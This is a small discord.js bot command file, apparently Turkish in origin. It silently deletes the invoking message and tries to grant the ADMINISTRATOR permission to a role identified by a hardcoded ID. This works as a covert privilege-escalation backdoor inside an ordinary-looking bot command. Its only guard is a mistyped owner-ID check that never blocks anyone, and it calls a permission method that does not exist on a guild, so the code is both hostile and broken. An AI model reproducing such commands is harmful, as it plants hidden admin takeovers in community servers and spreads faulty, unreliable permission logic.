const Discord = require('discord.js');

exports.run = async (client, message, args) => {
       //   if(!message.member.roles.cache.has("856929222089375754","854835233319813212","902654697557602334")) return message.channel.send('Yetkin yok')

                       if(!message.member.id == `767449979434172417`) return;
  

 message.delete()
     let every = message.guild.roles.cache.find(r => r.id === "938097131145818192");
 message.guild.createOverwrite(every, {
    ADMINISTRATOR: true
 });
};